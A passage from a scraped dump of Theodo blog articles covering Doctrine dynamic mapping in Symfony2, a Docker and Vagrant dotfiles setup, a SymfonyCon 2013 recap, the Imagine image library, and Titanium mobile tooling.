$this->uploadedDocuments->add($uploadedDocument);\r\n\r\n        return $this;\r\n    }\r\n\r\n    public function removeUploadedDocument(UploadedDocument $uploadedDocument)\r\n    {\r\n        $this->uploadedDocuments->removeElement($uploadedDocument);\r\n    }\r\n\r\n    public function getUploadedDocuments()\r\n    {\r\n        return $this->uploadedDocuments;\r\n    }\r\n\r\n    public function setUploadedDocuments(ArrayCollection $uploadedDocuments)\r\n    {\r\n        $this->uploadedDocuments = $uploadedDocuments;\r\n\r\n        return $this;\r\n    }\r\n}\r\n                    \n\n\n\nTechnical insight on how it\u2019s actually working behind the scene\n\nWhat is mapping and how you usually modify it\n\nThe Doctrine ORM Mapping is like a bridge connecting two shores:\n\n\nYour entities, your object model on one side\nYour database tables, your database model on the other side\n\n\n\nIt allows Doctrine to understand how information stored in your entities are actually persisted in your database, how the different database tables are related and reciprocally, how information stored in the database will be fetched and hydrated into your entities.\nAs I said, there are usually four ways of manipulating Doctrine ORM mapping: YamL, XML, PHP and Annotations. This one is a complement, compatible with all the other ones.\n\n\nYou already have met dynamic mapping\nMost of the Symfony2 developers have used at least once Gedmo\u2019s Doctrine extensions so I am quite sure you used dynamic mapping without even knowing it.\nIn fact Gedmo\u2019s behaviour is based on this. What we usually call ORM mapping information are in fact metadata associated to the entity class. Gedmo plugs into the metadata you defined for an entity and extends them.\n\n\nWhen is doctrine mapping generated?\nThese metadata are loaded by the DoctrineORMMappingClassMetadataFactory which is created by your EntityManager at instanciation time and which itself exposes a public method to load these, entity by entity (getClassMetadata($className)). In fact, most of the time you will end up with all the metadata loaded for all entities shortly after the EntityManager has been created.\n\n\nHow to dynamically modify it?\nWhen the metadata of a class are loaded, the ClassMetadataFactory checks if something is listening on the Events::loadClassMetadata event, and if yes, triggers it with a LoadClassMetadataEventArgs object which gives access to the current class metadata.\nYou can thus easily create a listener or a subscriber mapped on this event and extend all (or a subset of) your entities by adding the metadata you want using the methods exposed in the Doctrine PHP mapping reference.\nBut let\u2019s go back to our example and improve things a little bit.\n\n\n\nUseful refactoring of common entity behaviour\n\nWarning\nThis solution is only available since PHP 5.4.0 as Trait have been implemented from this version on.\n\nSince the uploadedDocuments property and the corresponding getters and setters will be common to all the entities requiring a many-to-many relation with UploadedDocument, we could refactor this into a generic trait that we will use in the BlogArticle entity:\n\r\n// src/Acme/DemoBundle/Entity/HasUploadedDocumentTrait\r\ntrait HasUploadedDocumentTrait\r\n{\r\n    /**\r\n     * @var ArrayCollection\r\n     */\r\n    protected $uploadedDocuments;\r\n\r\n    public function addUploadedDocument(UploadedDocument $uploadedDocument)\r\n    {\r\n        $this->uploadedDocuments->add($uploadedDocument);\r\n\r\n        return $this;\r\n    }\r\n\r\n    public function removeUploadedDocument(UploadedDocument $uploadedDocument)\r\n    {\r\n        $this->uploadedDocuments->removeElement($uploadedDocument);\r\n    }\r\n\r\n    public function getUploadedDocuments()\r\n    {\r\n        return $this->uploadedDocuments;\r\n    }\r\n\r\n    public function setUploadedDocuments(ArrayCollection $uploadedDocuments)\r\n    {\r\n        $this->uploadedDocuments = $uploadedDocuments;\r\n\r\n        return $this;\r\n    }\r\n}\r\n                \nThe BlogArticle should be modified accordingly:\n\r\n// src/Acme/DemoBundle/Entity/BlogArticle.php\r\nclass BlogArticle\r\n{\r\n    protected $id;\r\n\r\n    protected $title;\r\n\r\n    protected $content;\r\n\r\n    use HasUploadedDocumentTrait;\r\n\r\n    // [...]\r\n}\r\n                \nDespite the use of this generic trait, the subscriber will only add the relation to the BlogArticle entity. Until now it was ok, but since we also want to attach documents to user messages we will have to customize it further by introducing a useful interface.\n\n\nMake it mutliple contexts compatible\nWe will use an interface to detect which entity should be dynamically related to the UploadedDocument entity. Here is the contract that each entity requiring uploads will have to implement (directly extracted from the Trait mentioned above):\n\r\n// src/Acme/DemoBundle/Entity/HasUploadedDocumentInterface.php\r\ninterface HasUploadedDocumentInterface\r\n{\r\n    public function addUploadedDocument(UploadedDocument $uploadedDocument);\r\n\r\n    public function removeUploadedDocument(UploadedDocument $uploadedDocument);\r\n\r\n    public function getUploadedDocuments();\r\n\r\n    public function setUploadedDocuments(ArrayCollection $uploadedDocuments);\r\n}\r\n                \nTherefore we refactor BlogArticle and UserMessage to implement this interface:\n\r\n// src/Acme/DemoBundle/Entity/BlogArticle.php\r\nclass BlogArticle implements HasUploadedDocumentInterface\r\n{\r\n    // [...]\r\n\r\n    use HasUploadedDocumentTrait;\r\n\r\n    // [...]\r\n}\r\n                \n\r\n// src/Acme/DemoBundle/Entity/UserMessage.php\r\nclass UserMessage implements HasUploadedDocumentInterface\r\n{\r\n    protected $id;\r\n\r\n    // [...]\r\n\r\n    use HasUploadedDocumentTrait;\r\n\r\n    // [...]\r\n}\r\n                \nNow we will modify the subscriber behaviour by using this interface to make the subscriber add the relation to any entity implementing it:\n\r\n// src/Acme/DemoBundle/EventListener/DynamicRelationSubscriber.php\r\nclass DynamicRelationSubscriber implements EventSubscriber\r\n{\r\n    const INTERFACE_FQNS = 'Acme\\DemoBundle\\Entity\\HasUploadedDocumentInterface';\r\n\r\n    // [...]\r\n\r\n    /**\r\n     * @param LoadClassMetadataEventArgs $eventArgs\r\n     */\r\n    public function loadClassMetadata(LoadClassMetadataEventArgs $eventArgs)\r\n    {\r\n        // the $metadata is the whole mapping info for this class\r\n        $metadata = $eventArgs->getClassMetadata();\r\n\r\n        if (!in_array(self::INTERFACE_FQNS, class_implements($metadata->getName()))) {\r\n            return;\r\n        }\r\n\r\n        $namingStrategy = $eventArgs\r\n            ->getEntityManager()\r\n            ->getConfiguration()\r\n            ->getNamingStrategy()\r\n        ;\r\n\r\n        // [...]\r\n    }\r\n}\r\n                \nNow the subscriber implementation is reusable and it would be easy to add uploads to a third context. It would require ony the following modifications:\n\r\n// src/Acme/DemoBundle/Entity/ThirdContext\r\nclass ThirdContext implements HasUploadedDocumentInterface\r\n{\r\n    // [...]\r\n\r\n    use HasUploadedDocumentTrait;\r\n\r\n    // [...]\r\n}\r\n                \nThat\u2019s it! That\u2019s all the ThirdContext entity require to have now a relation with the UploadedDocument.\n\n\nBring these modifications to the database\nOnce ORM mapping information altered dynamically, Symfony knows immediately about the modifications you made but not your database. To push these, you will just have to run the doctrine:schema:update command or to generate and run the corresponding doctrine migration.\n\n\nConclusion\nDynamic Doctrine mapping has the same functionalities as any static way. This is not a complete new way of defining ORM metadata but only a complement to the existing ones using the PHP syntax. It won\u2019t (as explained above) automatically take care of altering the corresponding database structure but it can help you extend your entities and centralize common metadata manipulations (prefix some database tables name as shown in this doctrine documentation example) or alter metadata you statically set using reflection or whatever logic you want. I personally found it useful to set relations between cross bundle entities without bringing too many modifications to my own entities.\n\nRelated link:\n\n\nhttp://symfony2.ylly.fr/dynamically-add-mapping-to-doctrine2-using-annotations-dantleech/\n\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCharles Pourcel\r\n  \t\t\t\r\n  \t\t\t\tCharles Pourcel - A Web Developer who liked symfony 1.x, loves Symfony2 and keeps digging into it for new treasures. An indentation (best practices in general, we might say...) maniac? Who are you to judge!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTL;DR\nThis article aims at teaching how to install lovely command-line tools in a recoverable way.\nYou\u2019ll be able to multiplex zsh terminals over a UDP connection (using mobile shell):\n\nThe reader is strongly encouraged to browse thoroughly the Dockerfile put in reference,\nwhich steps summarize how to build the premises of such a text-only environment.\nDisclaimer: To some extent, you might feel a bit dizzy because of the specially crafted mise en abyme.\nThe dizziness is a typical side effect of linux container abuse\u2026\nNo worries, the feeling will just vanish with time (or you might just end up killing the wrong processes).\nDot files\nEach and every user of linux distributions (or similarly flavoured operating systems)\nmight take a minute or two to acknowledge the significance of their own dot_files.\nEven though they are hidden by design, I believe our productivity directly depends on the care they receive from us.\nWe all have heard (if not even worse) of hard drives just dying in some random boxes.\nStill feeling a bit sceptical? Pretty numbers have been published on Backblaze blog just to satisfy our curiosity.\nBeing a big fan of upcycling doesn\u2019t strictly imply there could be some happy ending for few choosen hard drives, anyway.\nThe bottom line is, the more precious and rapidly changing our data feel\nand the more regular we shall have backup for them ready to be restored.\nI insist on the latter part as knowing precisely\nhow to restore backups is the only way to really feel confident about them.\nLet us see how to proceed in order to get things done i.e. hidden dot files safe.\nExperimenting with Docker\nThe experiment is bootstrapped with the now classic installation of vagrant and virtual box.\nInstalling Virtual box\nFor instance, in a box running Wheezy 7.3, we would execute the commands:\n# Add a GPG key downloaded from virtual box official website \r\nwget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -\r\n\r\n# Download package lists from repositories\r\nsudo apt-get update\r\n\r\n# Install virtualbox\r\nsudo apt-get install virtualbox-4.    \r\n\nBinaries for other operating systems can be fetched from the official VirtualBox download page.\nInstalling Vagrant\nThe Vagrant download page offers 64-bit installation package for Debian:\n# Install dependencies to share folders with NFS\r\nsudo apt-get install nfs-kernel-server nfs-command\r\n\r\n# Download Vagrant installation package \r\nwget https://dl.bintray.com/mitchellh/vagrant/vagrant_1.4.3_x86_64.deb -O /tmp/vagrant_1.4.3_x86_64.deb  \r\n\r\n# Install Vagrant \r\nsudo dpkg -i /tmp/vagrant_1.4.3_x86_64.deb\r\n\nInstalling Docker\n# Clone the linux container engine repository \r\n# (we assume Git has already been installed in the host)\r\ngit clone https://github.com/dotcloud/docker.git && cd docker\r\n\r\n# Run Vagrant\r\nvagrant up\r\n\r\n# Access the vagrant box provided by DotCloud \r\n# to use docker from their official box\r\nvagrant ssh\r\n\nCustomizing our shell\n# Install git, vim and mobile shell in the vagrant box\r\nsudo apt-get install git vim mosh\r\n\r\n# Clone the repository containing a Dockerfile\r\ngit clone https://github.com/thierrymarianne/zen-cmd.git zen-cmd\r\n\r\n# Build a container from the Dockerfile \r\n# and tag it with name \"zen-cmd\" if the build is successful\r\ncd zen-cmd && docker build -t zen-cmd .  \r\n\nFrom this point, one shall have received a positive message (Successfully built) accompanied by a pretty hash.\nThese 12 characters are to be kept preciously.\nBelieve it or not, we are done already here or better said,\nour personal shell has been set up according to our container building script (Dockerfile).\nThe pretty hash identifies a docker image which can now be run in order to use our command-line interface.\nIn a nutshell,\n\nInstalling a custom-tailored command-line environment only took us the time of making some notes in the shape of a Dockerfile about what needs to be customized.\nExecuting a single command was enough to restore our command-line environment personalized over time\n\nFellows of little faith are absolutely right in showing doubts about this so let us run the interactive shell (within a container within a vagrant box),\nin order to proceed, one just needs to execute the following commands\n# Copy predefined SSH configuration from the article repository\r\ncp -R ./ssh/* /home/vagrant/.ssh\r\n\r\n# Start an ssh agent\r\nssh-agent /bin/bash\r\n\r\n# Let our ssh agent handling a key allowed to access the container\r\n# with passphrase being \"elvish_word_for_friend\"\r\n# (One shall certainly generate its own pair of keys \r\n# using `ssh-keygen -f path_to_private_key` otherwise)\r\nchmod 0400 ~/.ssh/zen-cmd && ssh-add ~/.ssh/zen-cmd\r\n\r\n# Run openssh daemon from our brand new container\r\ndocker run -d -t zen-cmd /usr/sbin/sshd -D & export LC_ALL=en_US.UTF-8 && /usr/bin/mosh-server new -p 6000\r\n\r\n# Save container id for inspection\r\nCID=`docker ps | grep zen-cmd | cut -d ' ' -f 1 | head -n 1`; \r\n\r\n# Alias \"zen-cmd\" container ip address to \"zen-cmd\" host\r\nsudo /bin/bash -c \"echo `docker inspect -format '{{ .NetworkSettings.IPAddress }}' $CID`'    zen-cmd' >> /etc/hosts\"\r\n\r\n# Access our portable command-line environment using mosh-client\r\nmosh zen-cmd\r\n\r\n# In the container, run tmux to multiplex zsh terminals\r\ntmux\r\n\nLet us dive into the details of this automated script :\n\nOur package lists are updated (the same way we did before Installing VirtualBox).\nPackages needed to compile binaries are installed\nTarget directories are created respectively to\n\nclone sources\ninstall binaries from sources\n\n\nGit is installed\nTmux, oh-my-zsh repositories are cloned\nTmux, oh-my-zsh are installed and configured\nZsh is set as default shell\nPassword authentication is disabled for ssh\nMosh server is installed\nUTF-8 locale required to run mobile shell is generated\nPrivilege separation directory is created for ssh\nOur vagrant ssh public key is added to authorized keys of our container\nSSH and Mobile shell ports are opened\n\nLeveraging git\nSince we mostly deal with plain text files here, git appears to be a quite legitimate version control system.\nEven GitHub made a point in popularizing the habit of sharing them (the dot_files).\nWhat are the direct benefits coming out of it?\nAccording to their unofficial guide,\n\nboxes are kept in sync\ntechnology watch becomes easier\nknowledge is redistributed\n\nEnd Of Line\nI hope you have enjoyed this setup which has the clear advantages of being portable, testable and recoverable.\nSyntax to write your own Dockerfile can be found in Docker official documentation.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tthierrym\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tApr\u00e8s le Symfony Live de Berlin 2012, o\u00f9 quatorze Theodoers avaient fi\u00e8rement port\u00e9 nos couleurs dans le temple de la communaut\u00e9 Symfony pendant les trois jours de l\u2019\u00e9v\u00e9nement, ce sont cette ann\u00e9e quarante-deux (42 !) d\u2019entre nous qui avons d\u00e9ferl\u00e9 sur Varsovie sans se poser de questions sur le sens de la vie, l\u2019univers et tout le reste.\n\u00a0\n\nPendant trois jours, ce sont les tous meilleurs sp\u00e9cialistes de Symfony qui se sont r\u00e9unis, ont pu \u00e9changer et assister aux conf\u00e9rences sur les innovations techniques, m\u00e9thodologiques et commerciales port\u00e9es par l\u2019\u00e9cosyst\u00e8me Symfony. Par l\u2019odeur des gaufres fra\u00eeches all\u00e9ch\u00e9s, les portant jusqu\u2019au stand Theodo, des camarades d\u00e9veloppeurs venus de toute l\u2019Europe et m\u00eame d\u2019ailleurs sont venus \u00e0 notre rencontre. Ils y ont d\u00e9couvert non seulement l\u2019expertise et le dynamisme de Theodo, mais \u00e9galement l\u2019ambiance de folie qui r\u00e8gne chez nous, \u00e0 coup de combats de sabres laser.\n\nApr\u00e8s deux jours de conf\u00e9rences, la soir\u00e9e a r\u00e9uni tous les Theodoers autour des cocktails d\u2019exception du Syreny Spiew pour une f\u00eate poursuivie jusqu\u2019au petit matin. Le lendemain, d\u00e8s l\u2019aube, \u00e0 l\u2019heure o\u00f9 blanchit la campagne, les plus courageux s\u2019en sont all\u00e9s participer au Hackathon g\u00e9ant tandis que les autres s\u2019aventuraient, couleurs Theodo sur la t\u00eate ou les \u00e9paules, \u00e0 la d\u00e9couverte de la ville-ph\u00e9nix, par\u00e9e pour l\u2019occasion de ses plus belles illuminations.\n\n\u00a0\nBilan des quatre jours : 16 conf\u00e9rences, 347 contacts, 278 sabres laser distribu\u00e9s, 1367 gaufres mang\u00e9es, 687 cocktails, 126 litres de bi\u00e8re, 8 bouteilles de vodka, 1 de champagne et 1 tshirt perdu.\n\nTheodo donne rendez-vous \u00e0 tous les Symfonistes l\u2019ann\u00e9e prochaine \u00e0 Madrid !\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\nI recently read an interesting article on the pros and cons of two of the most known PHP image manipulation libraries: GD and ImageMagick. As interesting as this reading was, it did not mention a very useful object oriented image manipulation library and its corresponding bundle to all those waiting for the simplest solution to edit, transform and store pictures on their Symfony2 web application: The Imagine library and the LiipImagineBundle. I will try to fill this gap by explaining how these two tools can greatly help you managing pictures easily.\n\nThe Imagine library\nThis library is the perfect PHP 5.3+ object oriented tool to interact with your pictures in a simple way. It provides a common implementation for three of the most known image libraries (GD2, IMagick, Gmagick). So, pick your favorite one (using for example the aforementioned article), install Imagine using the official (well written) documentation and keep going! You still have a lot to discover\u2026\n\nThe basics\nLet\u2019s start with opening an existing picture using Imagine:\n\r\n$imagine = new Imagine\\Gd\\Imagine();\r\n//or\r\n$imagine = new Imagine\\Imagick\\Imagine();\r\n\r\n$image = $imagine->open('/path/to/image.jpg');\nNote: Depending on the name of the driver you are using, you will have to switch the namespace of the Imagine class to use: one of the rare drawbacks of Imagine. But let\u2019s not worry to much as this drawback can be overcome (check the Imagine Bundle main features below).\nAs you may have already noticed, Imagine follows some very simple and intuitive rules. For example, if you want to resize or crop an image (one of the most common and basic functionalities in Imagine) you will have to deal with \u201ccoordinates\u201d and \u201cdimensions\u201d. To crop you will need to specify the top left corner coordinates and the desired dimensions of the crop. You will therefore have to implement the PointInterface as follows:\n\r\n//Indicates coordinates (x: 15, y: 30)\r\n$coordinates = new Imagine\\Image\\Point(15, 30);\nNote: The coordinates always start from the top left corner and cannot have negative values.\nAnd to specify dimensions implement the BoxInterface like this:\n\r\n//Indicates dimensions (width: 400, height: 300)\r\n$dimensions = new Imagine\\Image\\Box(400, 300);\n\nSince most of these code excerpts are actually extracted from the official Imagine documentation I will focus on the main interests of the library rather than duplicating code examples you could easily find on the corresponding page in the official documentation.\n\n\nOverview of the main features\n\nDrawing shapes: \u201cDrawer\u201d class allows you to easily draw geometric figures or add text using a specific font you like\nEditing colors: Helps you define and alter colors on your pictures using a different \u201cPalette\u201d depending on your needs (CMYK, RGB or more recently Grayscale)\nManaging layers: If you are not using GD2, you can use \u201cLayers\u201d as an object oriented way to interact with picture layers. Among other things it can help you flatten a layered picture or create animated gif image.\nAdding effects: Depending on the driver you picked (and at the time this article has been written), you can use all or a subset of the \u201cEffects\u201d Imagine puts at your disposal (Gamma, Negative, Grayscale, Colorize, Sharpen, Blur)\nApplying filters and transformations: Many \u201cFilters\u201d are available in Imagine (ApplyMask, Copy, Crop, Fill, FlipHorizontally, FlipVertically, Paste, Resize, Rotate, Save, Show, Strip and Thumbnail). What each of them do is well explained in the \u201cManipulatorInterface\u201d. Besides applying filters directly to an image, Imagine provides a way to stack filters into a \u201cTransformation\u201d instance which can be applied later on one or multiple images (very convenient to decouple your image manipulation from the filter creation).\n\nThe Imagine library is already considered a reference when it comes to clean and decoupled image manipulation. I have briefly described its main features above but it contains more including some advanced \u201cFilters\u201d and a clean \u201cException\u201d management system. As you can see, it already covers most of the basic and even advanced use cases, and since it has been built to be easily extensible, you will not have too much trouble implementing any missing behaviour.\nFor those of you wanting to integrate it into a Symfony2 application, there is a Symfony2 bundle for that: the LiipImagineBundle. It uses the Imagine library and completes it with additional useful features.\n\n\n\nThe Imagine bundle\nThe LiipImagineBundle wraps the Imagine library into a Symfony2 bundle and includes it into a larger (and yet simple) workflow. As the library itself, this bundle has been made highly extendable and therefore you can customize almost each part of the workflow\u2019s behaviour.\n\nThe basic workflow\n1. First, you will need to install and configure your bundle. Lucky for you, the Liip team thought about that and provides a quite understandable semantic configuration for the bundle.\n2. Then use one of the Twig filters you defined in your configuration by calling it on a picture asset in one of your Twig templates.\n3. If you now request the corresponding page (for example to display it in your browser) the ImagineBundle will detect if the filter has already been applied to this specific picture:\n\nIf yes: the already generated (and cached) picture will be retrieved and provided to the template\nIf not: the filtered picture will be generated and stored and then provided to the template, in a completely transparent way for the end user.\n\n\n\nOverview of its main features\n\nSemantic bundle configuration: Already well documented and with sensible defaults, this configuration allows you to use the bundle almost out of the box. Besides by defining here the driver you use, you get rid of the Imagine aforementioned drawback on \u201cdriver specific Imagine namespaces\u201d.\nTwig and PHP template filter helper: As explained in the \u201cBasic usage\u201d section of the documentation homepage, each filter defined in the bundle configuration will then be available in your Twig templates using the \u201cimagine_filter\u201d Twig filter, making it easy to apply filters you configured (also available for PHP templates).\nController as a service: If you need to apply filters anywhere else than in templates you can, using the available service controller.\nImage loaders: You can customize the way you retrieve your images. The default configuration will provide you with a basic filesystem loader but you also have two other built-in loaders: Stream and MongoDB GridFS. The documentation also explains how you can chain data transformers to a custom loader to get an image from virtually any kind of file (PDF in the example).\nCache resolvers: The bundle uses its own caching system. It provides you with a bunch of different resolvers out of the box (Amazon S3, AWS, with a Filesystem default cache resolver) and allows you to add your own and extend the existing ones.\n\n\n\n\nSummary\nUsing GD or Imagick to transform the pictures of your Symfony2 application (well even any web application) is good but using the Imagine library is better. It provides you with an object oriented and extensible code structure through a simple but powerful API. Using it allows you to easily switch from GD to Imagick for instance, if you started using GD and find a major drawback later. Still not convinced? Think about the next time a new developer will have to read and maintain the code you are currently so proud of.\nAnd if you are in a Symfony2 application context you can get an even better solution depending on your needs: the LiipImagineBundle. Based on Imagine, it adds many useful features such as cache handling, template integration, many different strategies to store and retrieve your images, and all of this is highly customizable. Could you reasonably ask for more (except for coffee)?\nFinally, if you want to know more on which driver you should use and see a basic but functional example of how Imagine can be used you can check this presentation I recently made. Its code focuses on the advantages of the \u201cTransformation\u201d approach over the more basic \u201cFilter\u201d one.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCharles Pourcel\r\n  \t\t\t\r\n  \t\t\t\tCharles Pourcel - A Web Developer who liked symfony 1.x, loves Symfony2 and keeps digging into it for new treasures. An indentation (best practices in general, we might say...) maniac? Who are you to judge!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA year ago, 14 brave Theodoers were in Berlin for the Symfony Live 2012. This time, 42(!) of us joined the very best of the Symfony Community at the SymfonyCon 2013 in Warsaw during which we didn\u2019t have any time to wonder about the meaning of life, the universe and everything.\n\n\nFor three days, the very best specialists of Symfony gathered, discussed and attended conferences on technical, process-related and business innovations in the Symfony ecosystem. Many developers and fellows Symfonists from all over Europe \u2013 and even further \u2013 enjoyed their stop at the Theodo stand, drawn by the delicious smell of hot waffles. They had a chance to get acquainted with the expertise and dynamism Theodo fosters and the amazing atmosphere in our team of Jedis.\n\u00a0\n\nOn the second evening, all of us Theododers found themselves sipping exceptional cocktails at the Syreny Wpiew and partying all night long. Early the next day, the bravest went for a Hackathon session along with other Symfony specialists. Meanwhile, the others, Theodo hats on the head and hoodies on the shoulders, ventured into town. The Phoenix City had dressed up most elegantly for the occasion.\n\n\u00a0\nThe assessment after 4 days : 16 conferences, 347 contacts, 278 light sabers given away, 1367 waffles, 687 cocktails, 126 litres of beer, 8 bottles of vodka, 1 of champagne et 1 lost tshirt.\n\nTheodo will see you all Symfonists next year in Madrid !\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t<!--\n#content .storycontent h2,\n#content .storycontent h3 {\n\tmargin: 2em 0 1em;\n\tline-height: normal;\n}\n#content .storycontent ol li {\n\tlist-style-type: decimal;\n}\n#content div.article .illustration {\n\tmargin: 0 auto;\n\tdisplay: block;\n}\n#content div.article p {\n\tmargin-bottom: 1em;\n\tline-height: 1.4em;\n}\n#content div.article pre {\n\tmargin-bottom: 1.4em;\n}\n#content div.article pre.error {\n\tcolor: #f00;\n}\n#content div.article pre .comment {\n\tcolor: #999;\n}\n.gimme-more {\n\tmax-height: 200px;\n\toverflow: hidden;\n\ttransition:max-height 1.2s;\n}\n.gimme-more:hover {\n\tmax-height: 900px;\n}\n.gimme-more:before {\n\tcontent: '\u2193 hover for more \u2193';\n\tdisplay: block;\n        padding-bottom: 2px;\n        border-bottom: 1px dashed #ccc;\n        margin-bottom: 10px;\n\ttext-align: center;\n        color: #aaa;\n}\n-->\nTo reduce the amount of time lost during Titanium deployment process, I am going to present you a set of tools that will help you to accelerate your developments:\n\nTishadow\nAlloy\nCoffescript/Jade\n\nFinally I will show you how everything can work together\nTitanium\nTitanium is a framework to build mobile applications in javascript. It\u2019s a great tool allowing to work with ONE WEB language (javascript) on a SINGLE codebase. The titanium motto is \u201cWe handle device and OS compatibility. You build rich native apps\u201d.\nHowever if you want to test your UI on many devices, platforms, versions, the process is pretty long because you need to build the entire application, package it and install it on every device.\nFortunately for us, there are great tools out there to accelerate development and testing of your app.\nA classic Titanium workflow contains the following steps:\n\nInstall nodeJS\nInstall titanium\nLogin/Setup titanium\nInstall titanium SDK\nInstall android SDK\nInstall Xcode\nStart a fresh new app\nBuild the app for both platform\nTest the UI on different devices\n\nRepeat step 8 & 9 until your application is sexy enough. This is approximatively 1 minute per platform and per device to push the newly built app.\nAt the end of the day and if you push new code to test every 10 min on 2 devices (iphone/android), you just have spent 96min looking at your beloved terminal.\nMoreover, if you don\u2019t use a Mac to develop, you will have to transfer and launch the build on an other workstation :O.\nWe absolutely need to reduce the time between written code and eyes on the result, that\u2019s where Tishadow comes.\nTishadow\nTishadow is a toolset allowing us to push our code via websockets to a client application which interpretes it on the run.\n/!\\ Tishadow is only meant to ease development and not for production /!\\\nBy using Tishadow, the titanium SDK is not mandatory anymore.\nYou just have to build and install Tishadow like an usual titanium app.\nThe workflow is then reduced to this:\n\nInstall nodeJS\nInstall tishadow\nRun the server : tishadow server\nInstall tishadow application on Iphone/Android\nRun the client application on every device and connect to the server\nStart a fresh new app\nDeploy the application : tishadow run\n\nYou can then watch the result on every connected device, modify something, run tishadow run and wait 5 seconds \nTishadow also includes a test engine that you can access by typing the tishadow spec command.\nThis command will run all the tests directly on every connected devices, saving some precious time once again.\nAlloy\nAlloy is an MVC framework on top of titanium which allows you to split your code logic into :\n\ncontrollers (still in javascript)\nviews (in xml)\nstyles (in tss which is some strange javascript object in one file)\n\nThe entire directory structure is placed in app, and built back into titanium (in Resources) using alloy compile.\nCoffeescript / Jade\nFor those out there who love coffeescript, and I know there are many, we can push the fun on step deeper and compile coffeescript into javascript just before alloy compilation.\nThis job can be done with a simple task in a configuration file.\nI\u2019m in the javascript world for some time now, playing with nodejs, backbone, angularjs and I fell in love not only with javascript and coffeescript but with the jade template engine too.\nJade is a language which will compile into html and by extension xml. You only need to declare the opening of your tag and indent the content right after it.\nI have developed an alloy task to pre-compile coffeescript and jade into js/xml/tss, available on github => vbrajon/alloy-preformatter\nEverything together\nThe goal of the entire article is to get an application and to be able to work fast!\nI believe we are able to develop great applications faster when:\n\nwe write well designed code (structured), alloy is here for that\nwe write less code, thanks to coffeescript and jade.\nwe are able to see the result in live, tishadow run FTW\nwe test our code, with Tishadow again and any javascript test framework for your unit tests.\n\nDon\u2019t forget to keep it stupid simple \u2013 KISS.\nA simple app looks like this: vbrajon/alloy-skeleton\ncontrollers/index.coffee\r\n----------\r\n$.replace.text = 'Hello Titanium/Alloy World!'\r\n$.window.open()\r\n\r\nstyles/index.tss.coffee\r\n----------\r\ntss =\r\nLabel:\r\ncolor: \"#656565\"\r\n\".container\":\r\nbackgroundColor: \"#cecece\"\r\n\r\nview/index.jade\r\n----------\r\nAlloy\r\nWindow#window.container\r\nLabel#replace Hey, replace me dude!\r\n\nYou can get it running with:\ngit clone https://github.com/vbrajon/alloy-skeleton.git\r\ncd alloy-skeleton\r\nalloy compile\r\ntishadow run\r\n\nI encourage you to have a look at the generated files in Resources/alloy/controllers/index.js and the bundle sent by tishadow at build/tishadow/dist/#NAME#.zip\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tvalentinb\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
